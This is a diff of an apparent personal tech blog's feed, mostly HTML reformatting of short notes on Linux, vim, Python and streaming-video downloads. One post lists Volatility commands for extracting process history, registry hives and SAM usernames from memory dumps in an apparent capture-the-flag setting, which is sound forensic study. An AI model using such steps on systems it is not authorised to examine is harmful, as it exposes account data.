@@ -24,20 +24,23 @@
     
     <content type="html"><![CDATA[<p>Blob格式视频下载一直比较困难，在此记录一些思路：</p>
 <ol>
-<li><p>首先找到blob网址，如下：<code>blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a82978</code></p>
+<li>
+<p>首先找到blob网址，如下：<code>blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a82978</code></p>
 </li>
-<li><p>在Chrome浏览器中，F12打开开发者工具</p>
+<li>
+<p>在Chrome浏览器中，F12打开开发者工具</p>
 </li>
-<li><p>刷新含有视频的目标网页，然后在Network选项卡中查看请求列表</p>
+<li>
+<p>刷新含有视频的目标网页，然后在Network选项卡中查看请求列表</p>
 </li>
-<li><p>寻找m3u8扩展名，然后打开指定链接：如<code>https://1252524126.vod2.xxxx.com/522ff1e0vodcq1252524126/867b83575285890790665095068/playlist.f3.m3u8?time=1592553016262</code></p>
+<li>
+<p>寻找m3u8扩展名，然后打开指定链接：如<code>https://1252524126.vod2.xxxx.com/522ff1e0vodcq1252524126/867b83575285890790665095068/playlist.f3.m3u8?time=1592553016262</code></p>
 </li>
-<li><p>事实上，m3u8是一个文本文件，使用记事本之类工具打开，可以看到如下内容：</p>
+<li>
+<p>事实上，m3u8是一个文本文件，使用记事本之类工具打开，可以看到如下内容：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-VERSION:3</span><br><span class="line">#EXT-X-TARGETDURATION:18</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:16.666667,</span><br><span class="line">playlist.f3.ts?start=0&amp;end=5506707&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=5506708&amp;end=8260155&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=8260156&amp;end=11013603&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=11013604&amp;end=13767427&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=13767428&amp;end=16520875&amp;type=mpegts</span><br><span class="line">#EXTINF:16.666667,</span><br><span class="line">playlist.f3.ts?start=16520876&amp;end=22027771&amp;type=mpegts</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
 <p>这样就可以分析出视频地址了，就是</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`https://1252524126.vod2.xxxx.com/522ff1e0vodcq1252524126/867b83575285890790665095068/playlist.f3.ts</span><br></pre></td></tr></table></figure>
-
 <p>直接下载视频即可</p>
 </li>
 </ol>
@@ -47,7 +50,8 @@
     
       &lt;p&gt;Blob格式视频下载一直比较困难，在此记录一些思路：&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;&lt;p&gt;首先找到blob网址，如下：&lt;code&gt;blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a82978&lt;/code
+&lt;li&gt;
+&lt;p&gt;首先找到blob网址，如下：&lt;code&gt;blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a82978&lt;/cod
     
     </summary>
     
@@ -65,15 +69,16 @@
     <published>2020-06-16T01:35:12.000Z</published>
     <updated>2020-06-16T00:09:38.480Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="ifconfig-not-found"><a href="#ifconfig-not-found" class="headerlink" title="ifconfig not  found"></a>ifconfig not  found</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig 在centos 最小化安装时，是不自带的</span><br><span class="line">可以使用ip addr 查看ip</span><br></pre></td></tr></table></figure>
-
-<h3 id="没有ip地址"><a href="#没有ip地址" class="headerlink" title="没有ip地址"></a>没有ip地址</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip addr发现ens33 没有inet 这个属性，那么就没法通过IP地址连接虚拟机。</span><br><span class="line">查看ens33网卡的配置：vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">从配置清单中可以发现 CentOS 7 默认是不启动网卡的（ONBOOT=no）。</span><br><span class="line">把这一项改为YES（ONBOOT=yes）</span><br><span class="line">重启网络服务： sudo service network restart</span><br></pre></td></tr></table></figure>
-
+    <content type="html"><![CDATA[<h3 id="ifconfig-not-found"><a class="markdownIt-Anchor" href="#ifconfig-not-found"></a> ifconfig not  found</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig 在centos 最小化安装时，是不自带的</span><br><span class="line">可以使用ip addr 查看ip</span><br></pre></td></tr></table></figure>
+<h3 id="没有ip地址"><a class="markdownIt-Anchor" href="#没有ip地址"></a> 没有ip地址</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip addr发现ens33 没有inet 这个属性，那么就没法通过IP地址连接虚拟机。</span><br><span class="line">查看ens33网卡的配置：vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">从配置清单中可以发现 CentOS 7 默认是不启动网卡的（ONBOOT=no）。</span><br><span class="line">把这一项改为YES（ONBOOT=yes）</span><br><span class="line">重启网络服务： sudo service network restart</span><br></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;ifconfig-not-found&quot;&gt;&lt;a href=&quot;#ifconfig-not-found&quot; class=&quot;headerlink&quot; title=&quot;ifconfig not  found&quot;&gt;&lt;/a&gt;ifconfig not  found&lt;/h3&gt;&lt;figure
+      &lt;h3 id=&quot;ifconfig-not-found&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ifconfig-not-found&quot;&gt;&lt;/a&gt; ifconfig not  found&lt;/h3&gt;
+&lt;figure class=&quot;highlight p
     
     </summary>
     
@@ -91,17 +96,26 @@
     <published>2020-03-28T01:18:00.000Z</published>
     <updated>2020-03-28T01:20:07.510Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="搜索高亮"><a href="#搜索高亮" class="headerlink" title="搜索高亮"></a>搜索高亮</h3><p>vim搜索设置高亮</p>
-<p>linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：  </p>
-<p>1、临时设置：vim打开文档<br>命令行形式输入：<code>set hlsearch</code>。<br>缺点：关闭文档后，下次打开，又需要重新设置一遍。  </p>
-<p>2、永久设置（推荐）：在<code>~/.vimrc</code>中设置<br>在文件中加上<code>set hlsearch</code><br>然后保存退出便可。<br>优点：一次设置，永久生效。  </p>
-<p>取消方法：<br><code>:noh</code></p>
+    <content type="html"><![CDATA[<h3 id="搜索高亮"><a class="markdownIt-Anchor" href="#搜索高亮"></a> 搜索高亮</h3>
+<p>vim搜索设置高亮</p>
+<p>linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：</p>
+<p>1、临时设置：vim打开文档<br>
+命令行形式输入：<code>set hlsearch</code>。<br>
+缺点：关闭文档后，下次打开，又需要重新设置一遍。</p>
+<p>2、永久设置（推荐）：在<code>~/.vimrc</code>中设置<br>
+在文件中加上<code>set hlsearch</code><br>
+然后保存退出便可。<br>
+优点：一次设置，永久生效。</p>
+<p>取消方法：<br>
+<code>:noh</code></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;搜索高亮&quot;&gt;&lt;a href=&quot;#搜索高亮&quot; class=&quot;headerlink&quot; title=&quot;搜索高亮&quot;&gt;&lt;/a&gt;搜索高亮&lt;/h3&gt;&lt;p&gt;vim搜索设置高亮&lt;/p&gt;
-&lt;p&gt;linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：  &lt;/p
+      &lt;h3 id=&quot;搜索高亮&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#搜索高亮&quot;&gt;&lt;/a&gt; 搜索高亮&lt;/h3&gt;
+&lt;p&gt;vim搜索设置高亮&lt;/p&gt;
+&lt;p&gt;linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：&lt;/p&gt;
+&lt;p&gt;1
     
     </summary>
     
@@ -124,12 +138,9 @@
     <content type="html"><![CDATA[<p>PackageKit是基于RedHat的linux中的图形化软件升级工具，下面描述一下如何禁止和启用自动升级。</p>
 <p>默认状态下是开启的。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停用</span></span><br><span class="line">systemctl stop packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁止自启动</span></span><br><span class="line">systemctl mask packagekit</span><br><span class="line">  Created symlink from /etc/systemd/system/packagekit.service to /dev/null.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载PackageKit</span></span><br><span class="line">yum remove PackageKit*</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装PackageKit</span></span><br><span class="line">yum install gnome-packagekit PackageKit-yum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自启动</span></span><br><span class="line">systemctl unmask packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看状态</span></span><br><span class="line">systemctl status packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动</span></span><br><span class="line">systemctl start packagekit</span><br></pre></td></tr></table></figure>
-
 <p>systemctl的常见用法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl 提供了一组子命令来管理单个的 unit，其命令格式为：</span><br><span class="line">systemctl [command] [unit]</span><br><span class="line">command 主要有：</span><br><span class="line">start：立刻启动后面接的 unit。</span><br><span class="line">stop：立刻关闭后面接的 unit。</span><br><span class="line">restart：立刻关闭后启动后面接的 unit，亦即执行 stop 再 start 的意思。</span><br><span class="line">reload：不关闭 unit 的情况下，重新载入配置文件，让设置生效。</span><br><span class="line">enable：设置下次开机时，后面接的 unit 会被启动。</span><br><span class="line">disable：设置下次开机时，后面接的 unit 不会被启动。</span><br><span class="line">status：目前后面接的这个 unit 的状态，会列出有没有正在执行、开机时是否启动等信息。</span><br><span class="line">is-active：目前有没有正在运行中。</span><br><span class="line">is-enable：开机时有没有默认要启用这个 unit。</span><br><span class="line">kill ：不要被 kill 这个名字吓着了，它其实是向运行 unit 的进程发送信号。</span><br><span class="line">show：列出 unit 的配置。</span><br><span class="line">mask：注销 unit，注销后你就无法启动这个 unit 了。</span><br><span class="line">unmask：取消对 unit 的注销。</span><br></pre></td></tr></table></figure>
-
 ]]></content>
     
     <summary type="html">
@@ -154,12 +165,14 @@
     <published>2020-03-16T00:50:12.000Z</published>
     <updated>2020-03-16T00:52:40.269Z</updated>
     
-    <content type="html"><![CDATA[<p>首先，进入虚拟环境，并激活<br>然后，运行命令<code>python -m idlelib.idle</code>，即可</p>
+    <content type="html"><![CDATA[<p>首先，进入虚拟环境，并激活<br>
+然后，运行命令<code>python -m idlelib.idle</code>，即可</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;首先，进入虚拟环境，并激活&lt;br&gt;然后，运行命令&lt;code&gt;python -m idlelib.idle&lt;/code&gt;，即可&lt;/p&gt;
+      &lt;p&gt;首先，进入虚拟环境，并激活&lt;br&gt;
+然后，运行命令&lt;code&gt;python -m idlelib.idle&lt;/code&gt;，即可&lt;/p&gt;
 
     
     </summary>
@@ -179,35 +192,31 @@
     <updated>2020-03-16T00:48:40.731Z</updated>
     
     <content type="html"><![CDATA[<p>关于读写文件，在Python中提供了<code>read()</code>、<code>write()</code>来读写一行，也提供了<code>readlines()</code>、<code>writelines()</code>读写多行的方式。此外，模块<code>pickle</code>、<code>json</code>允许我们以更方便快捷的方式处理序列化的数据集。</p>
-<h3 id="使用read-和write方法"><a href="#使用read-和write方法" class="headerlink" title="使用read 和write方法"></a>使用read 和write方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define list of places</span></span><br><span class="line">places = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="keyword">for</span> listitem <span class="keyword">in</span> places:</span><br><span class="line">        filehandle.write(<span class="string">'%s\n'</span> % listitem)</span><br></pre></td></tr></table></figure>
-
+<h3 id="使用read-和write方法"><a class="markdownIt-Anchor" href="#使用read-和write方法"></a> 使用read 和write方法</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define list of places</span></span><br><span class="line">places = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="keyword">for</span> listitem <span class="keyword">in</span> places:</span><br><span class="line">        filehandle.write(<span class="string">'%s\n'</span> % listitem)</span><br></pre></td></tr></table></figure>
 <p>注意，最后一行添加了<code>\n</code>，从这个文件中读取列表，可以使用以下代码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define an empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> filehandle:</span><br><span class="line">        <span class="comment"># remove linebreak which is the last character of the string</span></span><br><span class="line">        currentPlace = line[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add item to the list</span></span><br><span class="line">        places.append(currentPlace)</span><br></pre></td></tr></table></figure>
-
 <p>一定要注意，需要把最后的换行符去掉。</p>
-<h3 id="使用readlines-和-writelines方法"><a href="#使用readlines-和-writelines方法" class="headerlink" title="使用readlines 和 writelines方法"></a>使用readlines 和 writelines方法</h3><p>写入文件：</p>
+<h3 id="使用readlines-和-writelines方法"><a class="markdownIt-Anchor" href="#使用readlines-和-writelines方法"></a> 使用readlines 和 writelines方法</h3>
+<p>写入文件：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define list of places</span></span><br><span class="line">places_list = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    filehandle.writelines(<span class="string">"%s\n"</span> % place <span class="keyword">for</span> place <span class="keyword">in</span> places_list)</span><br></pre></td></tr></table></figure>
-
 <p>读取文件：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    filecontents = filehandle.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> filecontents:</span><br><span class="line">        <span class="comment"># remove linebreak which is the last character of the string</span></span><br><span class="line">        current_place = line[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add item to the list</span></span><br><span class="line">        places.append(current_place)</span><br></pre></td></tr></table></figure>
-
 <p>或者，以更精简的方式：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    places = [current_place.rstrip() <span class="keyword">for</span> current_place <span class="keyword">in</span> filehandle.readlines()]</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用pickle模块"><a href="#使用pickle模块" class="headerlink" title="使用pickle模块"></a>使用pickle模块</h3><p>Its <code>dump()</code> method stores the list efficiently as a binary data stream. Firstly, in line 7 (in the code below) the output file <code>listfile.data</code> is opened for binary writing<code>&quot;wb&quot;</code>. Secondly, in line 9<br>the list is stored in the opened file using the <code>dump()</code> method.</p>
+<h3 id="使用pickle模块"><a class="markdownIt-Anchor" href="#使用pickle模块"></a> 使用pickle模块</h3>
+<p>Its <code>dump()</code> method stores the list efficiently as a binary data stream. Firstly, in line 7 (in the code below) the output file <code>listfile.data</code> is opened for binary writing<code>&quot;wb&quot;</code>. Secondly, in line 9<br>
+the list is stored in the opened file using the <code>dump()</code> method.</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load additional module</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># define a list of places</span></span><br><span class="line">placesList = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.data'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="comment"># store the data as binary data stream</span></span><br><span class="line">    pickle.dump(placesList, filehandle)</span><br></pre></td></tr></table></figure>
-
 <p>We read the list from the file as follows. Firstly, the output file <code>listfile.data</code> is opened binary for reading <code>&quot;rb&quot;</code> in line 4. Secondly, the list of places is loaded from the file using the <code>load()</code> method.</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load additional module</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.data'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="comment"># read the data as binary data stream</span></span><br><span class="line">    placesList = pickle.load(filehandle)</span><br></pre></td></tr></table></figure>
-
 <p><code>pickle</code> works with all kind of Python objects such as strings, numbers, self-defined structures, and every other built-in data structure Python provides.</p>
-<h3 id="使用JSON"><a href="#使用JSON" class="headerlink" title="使用JSON"></a>使用JSON</h3><p>The binary data format <code>pickle</code> uses is specific to Python. To improve the interoperability between different programs the JavaScript Object Notation (<a href="https://en.wikipedia.org/wiki/JSON" target="_blank" rel="noopener">JSON</a>) provides an easy-to-use and human-readable schema, and thus became very popular.</p>
+<h3 id="使用json"><a class="markdownIt-Anchor" href="#使用json"></a> 使用JSON</h3>
+<p>The binary data format <code>pickle</code> uses is specific to Python. To improve the interoperability between different programs the JavaScript Object Notation (<a href="https://en.wikipedia.org/wiki/JSON" target="_blank" rel="noopener">JSON</a>) provides an easy-to-use and human-readable schema, and thus became very popular.</p>
 <p>写入文件：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># define list with values</span></span><br><span class="line">basicList = [<span class="number">1</span>, <span class="string">"Cape Town"</span>, <span class="number">4.6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># open output file for writing</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    json.dump(basicList, filehandle)</span><br></pre></td></tr></table></figure>
-
 <p>读取文件：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># open output file for reading</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    basicList = json.load(filehandle)</span><br></pre></td></tr></table></figure>
-
 <p>参考:<a href="https://stackabuse.com/reading-and-writing-lists-to-a-file-in-python/" target="_blank" rel="noopener">Reading and Writing Lists to a File in Python</a></p>
 ]]></content>
     
@@ -233,11 +242,9 @@
     
     <content type="html"><![CDATA[<p>Python里数量词默认是贪婪的，总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在<code>*</code>,<code>?</code>,<code>+</code>,<code>{m,n}</code>后面加上<code>?</code>，使贪婪变成非贪婪。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"This is a number 234-235-22-423"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r=re.match(<span class="string">".+(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'4-235-22-423'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r=re.match(<span class="string">".+?(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'234-235-22-423'</span></span><br></pre></td></tr></table></figure>
-
 <p>正则表达式模式中使用到通配字，那它在从左到右的顺序求值时，会尽量“抓取”满足匹配最长字符串</p>
 <p>解决方式：非贪婪操作符<code>?</code>，这个操作符要求正则匹配的越少越好。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2343'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+?)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+)ddd"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>) </span><br><span class="line"><span class="string">'2343'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+?)ddd"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2343'</span></span><br></pre></td></tr></table></figure>
-
 ]]></content>
     
     <summary type="html">
@@ -261,21 +268,22 @@
     <updated>2020-03-11T18:55:54.171Z</updated>
     
     <content type="html"><![CDATA[<p><a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="noopener">github: volatility</a></p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>在kali中，安装过程很简单</p>
+<h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h3>
+<h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h3>
+<p>在kali中，安装过程很简单</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install volatility</span><br></pre></td></tr></table></figure>
-
 <p>如果需要可以安装各种依赖，当然可以不安装</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Distorm3:牛逼的反编译库</span></span><br><span class="line">pip install distorm3</span><br><span class="line"></span><br><span class="line"><span class="comment">#Yara:恶意软件分类工具</span></span><br><span class="line">pip install yara</span><br><span class="line"></span><br><span class="line"><span class="comment">#PyCrypto:加密工具集</span></span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"><span class="comment">#PIL:图片处理库</span></span><br><span class="line">pip install pil</span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenPyxl:读写excel文件</span></span><br><span class="line">pip install openpyxl</span><br><span class="line"></span><br><span class="line"><span class="comment">#ujson:JSON解析</span></span><br><span class="line">pip install ujson</span><br></pre></td></tr></table></figure>
-
-<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接至官网下载exe文件， <a href="https://www.volatilityfoundation.org/releases" target="_blank" rel="noopener">Volatility 2.6 (Windows 10 / Server 2016)</a></p>
-<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo   <span class="comment">#获取镜像系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pslist/pstree/psscan 进程信息</span></span><br><span class="line"><span class="comment"># pslist无法显示隐藏/终止进程。解决这个问题的插件是psscan，这个插件输出的内容会比pslist多得多。</span></span><br><span class="line"><span class="comment"># pstree同样也是扫描进程的，但是是以进程树的形式出现的。</span></span><br><span class="line"></span><br><span class="line">volatility -f mem.raw  --profile=Win7SP1x64 pslist <span class="comment"># 列出所有进程</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 cmdscan <span class="comment">#查看命令行进程中历史命令</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 filescan | grep <span class="string">"flag"</span>  <span class="comment">#文件搜索，并过滤</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001155f90 --dump-dir=./ <span class="comment">#导出指定偏移的文件</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 hivelist <span class="comment">#列举缓存在内存中的注册表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看系统用户名</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K <span class="string">"SAM\Domains\Account\Users\Names"</span></span><br><span class="line"><span class="comment">#查看网络连接</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
-
+<h3 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h3>
+<p>直接至官网下载exe文件， <a href="https://www.volatilityfoundation.org/releases" target="_blank" rel="noopener">Volatility 2.6 (Windows 10 / Server 2016)</a></p>
+<h2 id="用法"><a class="markdownIt-Anchor" href="#用法"></a> 用法</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo   <span class="comment">#获取镜像系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pslist/pstree/psscan 进程信息</span></span><br><span class="line"><span class="comment"># pslist无法显示隐藏/终止进程。解决这个问题的插件是psscan，这个插件输出的内容会比pslist多得多。</span></span><br><span class="line"><span class="comment"># pstree同样也是扫描进程的，但是是以进程树的形式出现的。</span></span><br><span class="line"></span><br><span class="line">volatility -f mem.raw  --profile=Win7SP1x64 pslist <span class="comment"># 列出所有进程</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 cmdscan <span class="comment">#查看命令行进程中历史命令</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 filescan | grep <span class="string">"flag"</span>  <span class="comment">#文件搜索，并过滤</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001155f90 --dump-dir=./ <span class="comment">#导出指定偏移的文件</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 hivelist <span class="comment">#列举缓存在内存中的注册表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看系统用户名</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K <span class="string">"SAM\Domains\Account\Users\Names"</span></span><br><span class="line"><span class="comment">#查看网络连接</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
     
       &lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github: volatility&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;安装&quot;&gt;&lt;a hre
+&lt;h3 id=&quot;安装&quot;&gt;&lt;a cla
     
     </summary>
     
@@ -295,11 +303,9 @@
     
     <content type="html"><![CDATA[<p>Linux中遇到如下错误，</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Downloads# ssh -i prikeyfile  joanna@10.10.10.171</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;prikey&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key &quot;prikey&quot;: bad permissions</span><br><span class="line">joanna@10.10.10.171&apos;s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
-
 <p>这个prikeyfile是自己保存的，权限设的高</p>
 <p>遇到这个问题，需要把权限调低</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Keys need to be only readable by you:</span><br><span class="line"></span><br><span class="line">chmod 400 ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"># If Keys need to be read-writable by you:</span><br><span class="line"></span><br><span class="line">chmod 600 ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-
 ]]></content>
     
